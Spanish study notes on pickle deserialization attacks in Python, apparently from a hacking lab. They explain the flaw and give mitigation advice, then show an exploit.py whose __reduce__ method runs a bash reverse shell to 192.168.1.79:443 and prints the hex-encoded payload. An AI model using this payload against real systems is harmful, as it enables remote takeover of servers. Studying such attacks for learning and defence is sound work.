------

Un Ataque de **Deserialización Pickle** (**DES-Pickle**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

El impacto de un Ataque de Deserialización Pickle depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren de forma adecuada la entrada Pickle que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.


## Notas de Practica

![[Pasted image 20260227192639.png]]

Por detrás esta configurado pickle, el problema es que usa la función vulnerable de `pickle.load()`.

lo que vamos a hacer es crearnos un archivo `exploit.py`:

```bash
import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.79/443 0>&1"',))

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit())))

```

lo que podemos observar es un código donde manipulamos `__reduce__` el cual es una función mediante la cual se pueden ejecutar comandos, lo que vamos a hacer es ahora imprimir el objeto con `pickle` y además ponerlo en formato hexadecimal para que se valido:

![[Pasted image 20260227193742.png]]

como observamos ya tenemos una carga útil y si estamos en escucha, podemos intentar realizar la conexión.

